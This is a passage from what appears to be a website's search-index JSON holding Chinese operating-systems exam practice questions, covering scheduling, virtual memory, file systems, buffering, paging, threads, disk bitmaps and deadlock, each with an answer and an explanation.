D.\u5c31\u7eea\u8fdb\u7a0b\u4e2d\u67d0\u8fdb\u7a0b\u7684\u4f18\u5148\u7ea7\u9ad8\u4e8e\u5f53\u524d\u7684\u6267\u884c\u8fdb\u7a0b \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u5728\u53ef\u5265\u593a\u65b9\u5f0f\u4e0b\u5f15\u8d77\u8c03\u5ea6\u7684\u539f\u56e0\u662f\u5c31\u7eea\u8fdb\u7a0b\u4e2d\u67d0\u8fdb\u7a0b\u7684\u4f18\u5148\u7ea7\u9ad8\u4e8e\u5f53\u524d\u6267\u884c\u7684\u8fdb\u7a0b\u3002\u9898\u4e2d\u5e76\u672a\u6307\u660e\u7cfb\u7edf\u662f\u5206\u65f6\u7cfb\u7edf,A\u9519\u8bef\u3002\u6267\u884cP\u539f\u8bed\u64cd\u4f5c\u4f1a\u5bfc\u81f4\u4e2d\u65ad,\u4e0d\u4e00\u5b9a\u4f1a\u5f15\u8d77\u8c03\u5ea6(\u4f8b\u5982\u6b64\u65f6\u5185\u5b58\u4e2d\u53ea\u6709\u4e00\u4e2a\u8fdb\u7a0b),B\u9519\u8bef\u3002\u5728\u6267\u884c\u5b8c\u7cfb\u7edf\u8c03\u7528\u540e\u8fd4\u56de\u7528\u6237\u7a0b\u5e8f,\u5982\u679c\u6b64\u65f6\u7528\u6237\u7a0b\u5e8f\u4f18\u5148\u7ea7\u4ecd\u7136\u662f\u6700\u9ad8,\u5219\u4e0d\u4f1a\u5f15\u8d77\u8c03\u5ea6,C\u9519\u8bef\u3002","title":"3.2. Tue"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#33-wed","text":"\u5728\u865a\u62df\u5185\u5b58\u7ba1\u7406\u4e2d\uff0c\u5730\u5740\u53d8\u6362\u673a\u6784\u5c06\u903b\u8f91\u5730\u5740\u53d8\u6362\u4e3a\u7269\u7406\u5730\u5740\uff0c\u5f62\u6210\u8be5\u903b\u8f91\u5730\u5740\u7684\u9636\u6bb5\u662f \u3002\uff3b\u4e91\u5357\u5927\u5b66831\uff3d A\uff0e\u7f16\u8f91 B\uff0e\u7f16\u8bd1 C\uff0e\u94fe\u63a5 D\uff0e\u88c5\u8f7d \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u7f16\u8bd1\u8fc7\u7a0b\u6307\u7f16\u8bd1\u7a0b\u5e8f\u5c06\u7528\u6237\u6e90\u4ee3\u7801\u7f16\u8bd1\u6210\u76ee\u6807\u6a21\u5757\u3002\u6e90\u5730\u5740\u7f16\u8bd1\u6210\u76ee\u6807\u7a0b \u5e8f\u65f6\uff0c\u4f1a\u5f62\u6210\u903b\u8f91\u5730\u5740\u3002","title":"3.3. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#34-thu","text":"\u4e00\u4e2a\u591a\u9053\u6279\u5904\u7406\u7cfb\u7edf\u4e2d\u4ec5\u6709P1 \u548cP2 \u4e24\u4e2a\u4f5c\u4e1a\uff0cP2 \u6bd4P1 \u665a5ms \u5230\u8fbe\uff0c\u5b83\u4eec\u7684\u8ba1\u7b97\u548cI/O\u64cd\u4f5c\u987a\u5e8f\u5982\u4e0b\uff1a P1\uff1a\u8ba1\u7b9760ms\uff0cI/O 80ms\uff0c\u8ba1\u7b9720ms P2\uff1a\u8ba1\u7b97120ms\uff0cI/O 40ms\uff0c\u8ba1\u7b9740ms \u82e5\u4e0d\u8003\u8651\u8c03\u5ea6\u548c\u5207\u6362\u65f6\u95f4\uff0c\u5219\u5b8c\u6210\u4e24\u4e2a\u4f5c\u4e1a\u9700\u8981\u7684\u65f6\u95f4\u6700\u5c11\u662f \u3002\uff3b\u4e91\u5357\u5927\u5b66831\uff3d A\uff0e240ms B\uff0e260ms C\uff0e340ms D\uff0e360ms \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1aP2\u6bd4P1\u665a5ms\u5230\u8fbe\uff0cP1\u5148\u5360\u7528CPU\u3002 t = 0ms \u65f6\uff0cP1\u8ba1\u7b97 60ms\uff0cP2\u7b49\u5f85\u3002 t = 60ms \u65f6\uff0cP2\u8ba1\u7b97120ms\uff0cP1 I/O 80ms\u3002 t = 180ms \u65f6\uff0cP2 I/O 40ms\uff0c P1 \u8ba1\u7b97 20ms\uff0cP1\u7ed3\u675f\u3002 t = 220ms \u65f6\uff0cP2 \u8ba1\u7b97 40ms t = 260ms \u65f6\uff0cP2\u7ed3\u675f\u3002","title":"3.4. Thu"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#4-week-4","text":"","title":"4. Week 4"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#41-tue","text":"\u4e0b\u5217\u54ea\u4e2a\u5bf9\u8c61\u4e0d\u5c5e\u4e8e\u6587\u4ef6\u7cfb\u7edf\u7684\u4e00\u90e8\u5206\uff1a \uff3b\u4e2d\u56fd\u79d1\u5b66\u9662\u5927\u5b66-2016\uff3d A. \u5206\u533a\u8868 B. \u76ee\u5f55 C. \u8d85\u7ea7\u5757 D. \u7a7a\u95f2\u5757\u8868 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u76ee\u5f55\u7528\u4e8e\u6587\u4ef6\u7684\u903b\u8f91\u7ec4\u7ec7\uff0c\u8d85\u7ea7\u5757\u5305\u542b\u6587\u4ef6\u7cfb\u7edf\u7684\u603b\u4f53\u4fe1\u606f\uff0c\u7a7a\u95f2\u5757\u8868\u5bf9\u78c1\u76d8\u7684\u7a7a\u95f2\u5757\u8fdb\u884c\u7ba1\u7406\uff0c\u5b83\u4eec\u90fd\u662f\u6587\u4ef6\u7cfb\u7edf\u7684\u4e00\u90e8\u5206\u3002","title":"4.1. Tue"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/","text":"\u64cd\u4f5c\u7cfb\u7edf\u6bcf\u65e5\u4e00\u9898 2020 July # \u76ee\u5f55 # \u64cd\u4f5c\u7cfb\u7edf\u6bcf\u65e5\u4e00\u9898 2020 July \u76ee\u5f55 1. Week 3 1.1. Wed 1.2. Thu 1.3. Fri 1.4. Sat 1.5. Sun 2. Week 4 2.1. Mon 2.2. Tue 2.3. Wed 2.4. Thu 2.5. Fri 2.6. Sat 2.7. Sun 1. Week 3 # 1.1. Wed # \u8bbe\u6587\u4ef6\u7d22\u5f15\u8282\u70b9\u4e2d\u67097 \u4e2a\u5730\u5740\u9879,\u5176\u4e2d4 \u4e2a\u5730\u5740\u9879\u662f\u76f4\u63a5\u5730\u5740\u7d22\u5f15,2 \u4e2a\u5730\u5740\u9879\u662f\u4e00\u7ea7\u95f4\u63a5\u5730\u5740\u7d22\u5f15,1 \u4e2a\u5730\u5740\u9879\u662f\u4e8c\u7ea7\u95f4\u63a5\u5730\u5740\u7d22\u5f15,\u6bcf\u4e2a\u5730\u5740\u9879\u5927\u5c0f\u4e3a4 \u5b57\u8282\u3002\u82e5\u78c1\u76d8\u7d22\u5f15\u5757\u548c\u78c1\u76d8\u6570\u636e\u5757\u5927\u5c0f\u5747\u4e3a256 \u5b57\u8282,\u5219\u53ef\u8868\u793a\u7684\u5355\u4e2a\u6587\u4ef6\u6700\u5927\u957f\u5ea6\u662f \u3002\uff3b\u5409\u6797\u5927\u5b66\uff3d A.33 KB B.519 KB C.1057 KB D.16513 KB \u7b54\u6848 \u7b54\u6848\uff1aC \u6bcf\u4e2a\u76f4\u63a5\u5730\u5740\u7d22\u5f15\u53ef\u4ee5\u5b58\u50a8 256B \u6570\u636e\uff0c4\u4e2a\u53ef\u4ee5\u5b58\u50a8 1KB \u6570\u636e\u3002 \u4e00\u7ea7\u95f4\u63a5\u5730\u5740\u7d22\u5f15\u53ef\u4ee5\u5b58\u50a8 256 / 4 = 64 \u4e2a\u5730\u5740\u9879\uff0c\u5bf9\u5e94 64 x 256 = 16 KB\uff0c2\u4e2a\u4e3a 32KB\u3002 \u4e8c\u7ea7\u5730\u5740\u7d22\u5f15\u53ef\u4ee5\u5b58\u50a8 64 * 64 = 4K \u4e2a\u5730\u5740\u9879\uff0c\u5bf9\u5e94 4K x 256 = 1024 KB \u6570\u636e\u3002 \u7d2f\u52a0\u4e3a 1057 KB\u3002 1.2. Thu # \u4e0b\u5217\u5173\u4e8e\u865a\u62df\u5b58\u50a8\u5668\u7684\u53d9\u8ff0\u4e2d\uff0c\u6b63\u786e\u7684\u662f \u3002\uff3b\u4e2d\u5c71\u5927\u5b66\uff3d A\uff0e\u865a\u62df\u5b58\u50a8\u53ea\u80fd\u57fa\u4e8e\u8fde\u7eed\u5206\u914d\u6280\u672f B\uff0e\u865a\u62df\u5b58\u50a8\u53ea\u80fd\u57fa\u4e8e\u975e\u8fde\u7eed\u5206\u914d\u6280\u672f C\uff0e\u865a\u62df\u5b58\u50a8\u5bb9\u91cf\u53ea\u53d7\u5916\u5b58\u5bb9\u91cf\u7684\u9650\u5236 D\uff0e\u865a\u62df\u5b58\u50a8\u5bb9\u91cf\u53ea\u53d7\u5185\u5b58\u5bb9\u91cf\u7684\u9650\u5236 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u865a\u62df\u5185\u5b58\u7684\u5b9e\u73b0\u9700\u8981\u5efa\u7acb\u5728\u79bb\u6563\u5206\u914d\u7684\u5185\u5b58\u7ba1\u7406\u65b9\u5f0f\u7684\u57fa\u7840\u4e0a\uff0c\u6709\u4ee5\u4e0b\u4e09\u79cd\u5b9e\u73b0\u65b9\u5f0f\uff1a\u2460\u8bf7\u6c42\u5206\u9875\u5b58\u50a8\u7ba1\u7406\uff1b\u2461\u8bf7\u6c42\u5206\u6bb5\u5b58\u50a8\u7ba1\u7406\uff1b\u2462\u8bf7\u6c42\u6bb5\u9875\u5f0f\u5b58\u50a8\u7ba1\u7406\u3002\u865a\u62df\u5b58\u50a8\u5668\u5bb9\u91cf\u65e2\u4e0d\u53d7\u5916\u5b58\u5bb9\u91cf\u9650\u5236\uff0c\u4e5f\u4e0d\u53d7\u5185\u5b58\u5bb9\u91cf\u9650\u5236\uff0c\u800c\u662f\u7531CPU \u7684\u5bfb\u5740\u8303\u56f4\u51b3\u5b9a\u7684\u3002\u865a\u62df\u5b58\u50a8\u5668\u7684\u5b9e\u73b0\u53d7\u5916\u5b58\u5bb9\u91cf\u3001\u5185\u5b58\u5bb9\u91cf\u7684\u9650\u5236\u3002 1.3. Fri # \u82e5\u67d0\u5355\u5904\u7406\u5668\u591a\u8fdb\u7a0b\u7cfb\u7edf\u4e2d\u6709\u591a\u4e2a\u5c31\u7eea\u6001\u8fdb\u7a0b\uff0c\u5219\u4e0b\u5217\u5173\u4e8e\u5904\u7406\u673a\u8c03\u5ea6\u7684\u53d9\u8ff0\u4e2d\uff0c\u9519\u8bef\u7684\u662f \u3002\uff3b\u4e2d\u5c71\u5927\u5b66\uff3d A\uff0e\u5728\u8fdb\u7a0b\u7ed3\u675f\u65f6\u80fd\u8fdb\u884c\u5904\u7406\u673a\u8c03\u5ea6 B\uff0e\u521b\u5efa\u65b0\u8fdb\u7a0b\u540e\u80fd\u8fdb\u884c\u5904\u7406\u673a\u8c03\u5ea6 C\uff0e\u5728\u8fdb\u7a0b\u5904\u4e8e\u4e34\u754c\u533a\u65f6\u4e0d\u80fd\u8fdb\u884c\u5904\u7406\u673a\u8c03\u5ea6 D\uff0e\u5728\u7cfb\u7edf\u8c03\u7528\u5b8c\u6210\u5e76\u8fd4\u56de\u7528\u6237\u6001\u65f6\u80fd\u8fdb\u884c\u5904\u7406\u673a\u8c03 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u9009\u9879A\u3001B\u3001D \u663e\u7136\u662f\u53ef\u4ee5\u8fdb\u884c\u5904\u7406\u673a\u8c03\u5ea6\u7684\u60c5\u51b5\u3002\u5bf9\u4e8eC\uff0c\u5f53\u8fdb\u7a0b\u5904\u4e8e\u4e34\u754c\u533a\u65f6\uff0c\u8bf4\u660e\u8fdb\u7a0b\u6b63\u5728\u5360\u7528\u5904\u7406\u673a\uff0c\u53ea\u8981\u4e0d\u7834\u574f\u4e34\u754c\u8d44\u6e90\u7684\u4f7f\u7528\u89c4\u5219\uff0c\u662f\u4e0d\u4f1a\u5f71\u54cd\u5904\u7406\u673a\u8c03\u5ea6\u7684\uff0c\u6bd4\u5982\uff0c\u901a\u5e38\u8bbf\u95ee\u4e34\u754c\u8d44\u6e90\u53ef\u80fd\u662f\u6162\u901f\u7684\u5916\u8bbe\uff08\u5982\u6253\u5370\u673a\uff09\uff0c\u5982\u679c\u5728\u8fdb\u7a0b\u8bbf\u95ee\u6253\u5370\u673a\u65f6\uff0c\u4e0d\u80fd\u5904\u7406\u673a\u8c03\u5ea6\uff0c\u90a3\u4e48\u7cfb\u7edf\u7684\u6027\u80fd\u5c06\u662f\u975e\u5e38\u4f4e\u7684\u3002\u51e0\u79cd\u4e0d\u9002\u5408\u8fdb\u884c\u5904\u7406\u673a\u8c03\u5ea6\u7684\u60c5\u51b5\uff1a\u2460\u5728\u5904\u7406\u4e2d\u65ad\u7684\u8fc7\u7a0b\u4e2d\uff1b\u2461\u8fdb\u7a0b\u5728\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u7a0b\u5e8f\u4e34\u754c\u533a\u4e2d\uff1b\u2462\u5176\u4ed6\u9700\u8981\u5b8c\u5168\u5c4f\u853d\u4e2d\u65ad\u7684\u539f\u5b50\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\u3002 1.4. Sat # \u8bbe\u7cfb\u7edf\u7f13\u51b2\u533a\u548c\u7528\u6237\u5de5\u4f5c\u533a\u5747\u91c7\u7528\u5355\u7f13\u51b2\uff0c\u4ece\u5916\u8bbe\u8bfb\u51651 \u4e2a\u6570\u636e\u5757\u5230\u7cfb\u7edf\u7f13\u51b2\u533a\u7684\u65f6\u95f4\u4e3a100\uff0c\u4ece\u7cfb\u7edf\u7f13\u51b2\u533a\u8bfb\u51651 \u4e2a\u6570\u636e\u5757\u5230\u7528\u6237\u5de5\u4f5c\u533a\u7684\u65f6\u95f4\u4e3a5\uff0c\u5bf9\u7528\u6237\u5de5\u4f5c\u533a\u4e2d\u76841 \u4e2a\u6570\u636e\u5757\u8fdb\u884c\u5206\u6790\u7684\u65f6\u95f4\u4e3a90\u3002\u8fdb\u7a0b\u4ece\u5916\u8bbe\u8bfb\u5165\u5e76\u5206\u67902 \u4e2a\u6570\u636e\u5757\u7684\u6700\u77ed\u65f6\u95f4\u662f \u3002\uff3b\u6b66\u6c49\u7406\u5de5\u5927\u5b66\uff3d A.200 B.295 C.300 D.390 \u6ce8\uff1a\u6570\u636e\u5411\u5916\u4f20\u8f93\u5b8c\u6bd5\u4ee5\u540e\u624d\u80fd\u63a5\u6536\u65b0\u7684\u6570\u636e\u4f20\u5165 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a 100+5+MAX(90,100)+5+90==100+5+100+5+90=300 \u6ce8\uff1a\u7b2c1 \u6b21\u5206\u6790\u4e0e\u7b2c\u4e8c\u6b21\u8bfb\u5916\u8bbe\u5e76\u884c\u6267\u884c\u3002 \u6570\u636e\u57571 \u4ece\u5916\u8bbe\u5230\u7528\u6237\u5de5\u4f5c\u533a\u7684\u603b\u65f6\u95f4\u4e3a 105\uff0c\u5728\u8fd9\u6bb5\u65f6\u95f4\u4e2d\uff0c\u6570\u636e\u57572 \u6ca1\u6709\u8fdb\u884c\u64cd \u4f5c\u3002\u5728\u6570\u636e\u57571 \u8fdb\u884c\u5206\u6790\u5904\u7406\u65f6\uff0c\u6570\u636e\u57572 \u4ece\u5916\u8bbe\u5230\u7528\u6237\u5de5\u4f5c\u533a\u7684\u603b\u65f6\u95f4\u4e3a105\uff0c\u8fd9\u6bb5\u65f6 \u95f4\u662f\u5e76\u884c\u7684\u3002\u518d\u52a0\u4e0a\u6570\u636e\u57572 \u8fdb\u884c\u5904\u7406\u7684\u65f6\u95f490\uff0c\u603b\u5171\u662f300. 1.5. Sun # \u67d0\u8ba1\u7b97\u673a\u91c7\u7528\u4e8c\u7ea7\u9875\u8868\u7684\u5206\u9875\u5b58\u50a8\u7ba1\u7406\u65b9\u5f0f\uff0c\u6309\u5b57\u8282\u7f16\u5740\uff0c\u9875\u5927\u5c0f\u4e3a2^10\u5b57\u8282\uff0c\u9875\u8868\u9879\u5927\u5c0f\u4e3a2 \u5b57\u8282\uff0c\u903b\u8f91\u5730\u5740\u7ed3\u6784\u4e3a\uff1a \u903b\u8f91\u5730\u5740\u7a7a\u95f4\u5927\u5c0f\u4e3a2^16\u9875\uff0c\u5219\u8868\u793a\u6574\u4e2a\u903b\u8f91\u5730\u5740\u7a7a\u95f4\u7684\u9875\u76ee\u5f55\u8868\u4e2d\u5305\u542b\u8868\u9879\u7684\u4e2a\u6570\u81f3\u5c11\u662f______\u3002\uff3b\u897f\u5317\u5927\u5b66\uff3d A.64 B.128 C.256 D.512 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a1 \u9875\u4e3a1KB\uff0c\u4e00\u9875\u53ef\u5b58\u50a8512 \u4e2a\u9875\u5730\u5740\uff08\u9875\u8868\u9879\u5927\u5c0f\u4e3a2 \u5b57\u8282\uff09\uff0c\u903b\u8f91\u5730\u5740\u7a7a\u95f4\u5927\u5c0f\u4e3a2^16\u9875\uff0c\u9875\u8868\u5360\u75282^16/512=128 \u9875\uff0c\u6240\u4ee5\u9875\u76ee\u5f55\u4e2d\u81f3\u5c11\u8981\u6709128 \u4e2a\u8868\u9879\u3002 2. Week 4 # 2.1. Mon # \u4e0b\u5217\u5173\u4e8e\u8fdb\u7a0b\u548c\u7ebf\u7a0b\u7684\u53d9\u8ff0\u4e2d\uff0c\u6b63\u786e\u7684\u662f \u3002\uff3b\u897f\u5317\u5927\u5b66\uff3d A\uff0e\u4e0d\u7ba1\u7cfb\u7edf\u662f\u5426\u652f\u6301\u7ebf\u7a0b\uff0c\u8fdb\u7a0b\u90fd\u662f\u8d44\u6e90\u5206\u914d\u7684\u57fa\u672c\u5355\u4f4d B\uff0e\u7ebf\u7a0b\u662f\u8d44\u6e90\u5206\u914d\u7684\u57fa\u672c\u5355\u4f4d\uff0c\u8fdb\u7a0b\u662f\u8c03\u5ea6\u7684\u57fa\u672c\u5355\u4f4d C\uff0e\u7cfb\u7edf\u7ea7\u7ebf\u7a0b\u548c\u7528\u6237\u7ea7\u7ebf\u7a0b\u7684\u5207\u6362\u90fd\u9700\u8981\u5185\u6838\u7684\u652f\u6301 D\uff0e\u540c\u4e00\u8fdb\u7a0b\u4e2d\u7684\u5404\u4e2a\u7ebf\u7a0b\u62e5\u6709\u5404\u81ea\u4e0d\u540c\u7684\u5730\u5740\u7a7a\u95f4 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u5728\u7528\u6237\u7ea7\u7ebf\u7a0b\u4e2d\uff0c\u6709\u5173\u7ebf\u7a0b\u7ba1\u7406\u7684\u6240\u6709\u5de5\u4f5c\u90fd\u7531\u5e94\u7528\u7a0b\u5e8f\u5b8c\u6210\uff0c\u65e0\u9700\u5185\u6838 \u7684\u5e72\u9884\uff0c\u5185\u6838\u610f\u8bc6\u4e0d\u5230\u7ebf\u7a0b\u7684\u5b58\u5728\u3002\u5173\u4e8e\u8fdb\u7a0b\u548c\u7ebf\u7a0b\u7684\u5176\u4ed6\u533a\u522b\u89c1\u4e0b\u8868\u6240\u793a\uff1a \u7c7b\u578b \u8fdb\u7a0b \u7ebf\u7a0b \u8d44\u6e90\u5206\u914d \u8fdb\u7a0b\u662f\u8d44\u6e90\u5206\u914d\u548c\u62e5\u6709\u7684\u57fa\u672c\u5355\u4f4d \u7ebf\u7a0b\u81ea\u5df1\u57fa\u672c\u4e0d\u62e5\u6709\u7cfb\u7edf\u8d44\u6e90\uff0c\u4f46\u5b83\u53ef\u4ee5\u8bbf\u95ee\u6240\u5c5e\u8fdb\u7a0b\u62e5\u6709\u7684\u5168\u90e8\u8d44\u6e90 \u8c03\u5ea6 \u5728\u6ca1\u6709\u5f15\u5165\u7ebf\u7a0b\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u8fdb\u7a0b\u662f\u72ec\u7acb\u8c03\u5ea6\u548c\u5206\u6d3e\u7684\u57fa\u672c\u5355\u4f4d \u5f15\u5165\u7ebf\u7a0b\u540e\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u7ebf\u7a0b\u662f\u72ec\u7acb\u8c03\u5ea6\u548c\u5206\u6d3e\u7684\u57fa\u672c\u5355\u4f4d \u5730\u5740\u7a7a\u95f4 \u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u4e4b\u95f4\u76f8\u4e92\u72ec\u7acb \u540c\u4e00\u8fdb\u7a0b\u7684\u5404\u7ebf\u7a0b\u95f4\u5171\u4eab\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4 2.2. Tue # \u5728\u652f\u6301\u591a\u7ebf\u7a0b\u7684\u7cfb\u7edf\u4e2d\uff0c\u8fdb\u7a0bP \u521b\u5efa\u7684\u82e5\u5e72\u4e2a\u7ebf\u7a0b\u4e0d\u80fd\u5171\u4eab\u7684\u662f \uff3b\u897f\u5317\u5927\u5b66] A\uff0e\u8fdb\u7a0bP \u7684\u4ee3\u7801\u6bb5 B\uff0e\u8fdb\u7a0bP \u4e2d\u6253\u5f00\u7684\u6587\u4ef6 C\uff0e\u8fdb\u7a0bP \u7684\u5168\u5c40\u53d8\u91cf D\uff0e\u8fdb\u7a0bP \u4e2d\u67d0\u7ebf\u7a0b\u7684\u6808\u6307\u9488 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u8fdb\u7a0b\u4e2d\u67d0\u7ebf\u7a0b\u7684\u6808\u6307\u9488\uff0c\u5bf9\u5176\u5b83\u7ebf\u7a0b\u900f\u660e\uff0c\u4e0d\u80fd\u4e0e\u5176\u5b83\u7ebf\u7a0b\u5171\u4eab\u3002 2.3. Wed # \u4e0b\u5217\u9009\u9879\u4e2d\uff0c\u4e0d\u80fd\u6539\u5584\u78c1\u76d8\u8bbe\u5907I/O \u6027\u80fd\u7684\u662f \u3002\uff3b\u7535\u5b50\u79d1\u6280\u5927\u5b66\uff3d A\uff0e\u91cd\u6392I/O \u8bf7\u6c42\u6b21\u5e8f B\uff0e\u5728\u4e00\u4e2a\u78c1\u76d8\u4e0a\u8bbe\u7f6e\u591a\u4e2a\u5206\u533a C\uff0e\u9884\u8bfb\u548c\u6ede\u540e\u5199 D\uff0e\u4f18\u5316\u6587\u4ef6\u7269\u7406\u5757\u7684\u5206\u5e03 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u5bf9\u4e8eA\uff0c\u91cd\u6392I/O \u8bf7\u6c42\u6b21\u5e8f\u4e5f\u5c31\u662f\u8fdb\u884cI/O \u8c03\u5ea6\uff0c\u4ece\u800c\u4f7f\u8fdb\u7a0b\u4e4b\u95f4\u516c\u5e73\u5730\u5171\u4eab\u78c1\u76d8\u8bbf\u95ee\uff0c\u51cf\u5c11I/O \u5b8c\u6210\u6240\u9700\u8981\u7684\u5e73\u5747\u7b49\u5f85\u65f6\u95f4\u3002\u5bf9\u4e8eC\uff0c\u7f13\u51b2\u533a\u7ed3\u5408\u9884\u8bfb\u548c\u6ede\u540e\u5199\u6280\u672f\u5bf9\u4e8e\u5177\u6709\u91cd\u590d\u6027\u53ca\u9635\u53d1\u6027\u7684I/O \u8fdb\u7a0b\u6539\u5584\u78c1\u76d8I/O \u6027\u80fd\u5f88\u6709\u5e2e\u52a9\u3002\u5bf9\u4e8eD\uff0c\u4f18\u5316\u6587\u4ef6\u7269\u7406\u5757\u7684\u5206\u5e03\u53ef\u4ee5\u51cf\u5c11\u5bfb\u627e\u65f6\u95f4\u4e0e\u5ef6\u8fdf\u65f6\u95f4\uff0c\u4ece\u800c\u63d0\u9ad8\u78c1\u76d8\u6027\u80fd\u3002 2.4. Thu # \u6587\u4ef6\u7cfb\u7edf\u7528\u4f4d\u56fe\u6cd5\u8868\u793a\u78c1\u76d8\u7a7a\u95f4\u7684\u5206\u914d\u60c5\u51b5\uff0c\u4f4d\u56fe\u5b58\u4e8e\u78c1\u76d8\u768432\uff5e127 \u53f7\u5757\u4e2d\uff0c\u6bcf\u4e2a\u76d8\u5757\u53601024 \u4e2a\u5b57\u8282\uff0c\u76d8\u5757\u548c\u5757\u5185\u5b57\u8282\u5747\u4ece0 \u5f00\u59cb\u7f16\u53f7\u3002\u5047\u8bbe\u8981\u91ca\u653e\u7684\u76d8\u5757\u53f7\u4e3a409612\uff0c\u5219\u4f4d\u56fe\u4e2d\u8981\u4fee\u6539\u7684\u4f4d\u6240\u5728\u7684\u76d8\u5757\u53f7\u548c\u5757\u5185\u5b57\u8282\u5e8f\u53f7\u5206\u522b\u662f \uff3b\u7535\u5b50\u79d1\u6280\u5927\u5b66\uff3d A\uff0e81\uff0c1 B\uff0e81\uff0c2 C\uff0e82\uff0c1 D\uff0e82\uff0c2 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u4e00\u4e2a\u76d8\u5757\u67098192 \u4f4d\uff0c409612/8192=50\uff0c409612%8192= 12\uff0c\u6240\u4ee5\uff0c\u76d8\u5757\u53f7\u4e3a409612 \u5bf9\u5e94\u4f4d\u56fe\u4e2d\u7684\u76d8\u5757\u53f7\u4e3a32+50=82\uff0c\u5757\u5185\u5b57\u8282\u5e8f\u53f7floor(12/8) = 1 (0~7\u4f4d\u5757\u5185\u5b57\u8282\u5e8f\u53f7\u4e3a0, 8~15\u5757\u5185\u5b57\u8282\u5e8f\u53f7\u4e3a1) 2.5. Fri # \u5047\u8bbe5 \u4e2a\u8fdb\u7a0bP0\u3001P1\u3001P2\u3001P3\u3001P4 \u5171\u4eab\u4e09\u7c7b\u8d44\u6e90R1\u3001R2\u3001R3\uff0c\u8fd9\u4e9b\u8d44\u6e90\u603b\u6570\u5206\u522b\u4e3a18\u30016\u300122\u3002T0 \u65f6\u523b\u7684\u8d44\u6e90\u5206\u914d\u60c5\u51b5\u5982\u4e0b\u8868\u6240\u793a\uff0c\u6b64\u65f6\u5b58\u5728\u7684\u4e00\u4e2a\u5b89\u5168\u5e8f\u5217\u662f \uff3b\u7535\u5b50\u79d1\u6280\u5927\u5b66\uff3d A. P0, P2, P4, P1, P3 B. P1, P0, P3, P4, P2 C. P2, P1, P0, P3, P4 D. P3, P4, P2, P1, P0 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u521d\u59cb\u65f6\u8fdb\u7a0bP1 \u4e0eP3 \u53ef\u6ee1\u8db3\u9700\u6c42\uff0c\u6392\u9664A\u3001C\u3002\u5c1d\u8bd5\u7ed9P1 \u5206\u914d\u8d44\u6e90\uff0c\u5219P1 \u5b8c\u6210\u540eAvailable \u5c06\u53d8\u4e3a\uff086,3,6\uff09\uff0c\u65e0\u6cd5\u6ee1\u8db3P0 \u7684\u9700\u6c42\uff0c\u6392\u9664B\u3002\u5c1d\u8bd5\u7ed9P3 \u5206\u914d\u8d44\u6e90\uff0c\u5219P3 \u5b8c\u6210\u540eAvailable \u5c06\u53d8\u4e3a\uff084,3,7\uff09\uff0c\u8be5\u5411\u91cf\u80fd\u6ee1\u8db3\u5176\u4ed6\u6240\u6709\u8fdb\u7a0b\u7684\u9700\u6c42\u3002\u6240\u4ee5\uff0c\u4ee5P3 \u5f00\u5934\u7684\u6240\u6709\u5e8f\u5217\u90fd\u662f\u5b89\u5168\u5e8f\u5217\u3002 2.6. Sat # \u67d0\u7cfb\u7edf\u6709n \u53f0\u4e92\u65a5\u4f7f\u7528\u7684\u540c\u7c7b\u8bbe\u5907\uff0c\u4e09\u4e2a\u5e76\u53d1\u8fdb\u7a0b\u5206\u522b\u9700\u89813\u30014\u30015 \u53f0\u8bbe\u5907\uff0c\u53ef\u786e\u4fdd\u7cfb\u7edf\u4e0d\u53d1\u751f\u6b7b\u9501\u7684\u8bbe\u5907\u6570n \u6700\u5c0f\u4e3a \uff3b\u5409\u6797\u5927\u5b66\uff3d A\uff0e9 B\uff0e10 C\uff0e11 D\uff0e12 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u5982\u679c\u4e09\u4e2a\u5e76\u53d1\u8fdb\u7a0b\u5206\u522b\u83b7\u5f972\u30013\u30014 